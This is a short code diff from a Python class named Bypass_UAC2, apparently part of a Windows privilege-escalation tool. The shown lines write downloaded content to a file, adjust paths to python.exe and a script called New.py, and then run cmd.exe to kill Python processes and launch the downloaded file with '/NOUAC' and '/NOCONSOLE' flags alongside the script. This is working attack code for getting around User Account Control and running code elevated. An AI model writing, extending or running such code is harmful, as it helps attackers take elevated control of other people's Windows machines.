@@ -18,6 +18,6 @@ class Bypass_UAC2():
 		file.write(req.content)
 		file.close()
 
-		python = "\\".join(os.path.abspath(__file__).split("\\")[:-2]) + "\\python.exe"
-		me = "\\".join(os.path.abspath(__file__).split("\\")[:-2]) + "\\New.py"
+		python = "\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\python.exe"
+		me = "\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\New.py"
 		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.program], shell=True)
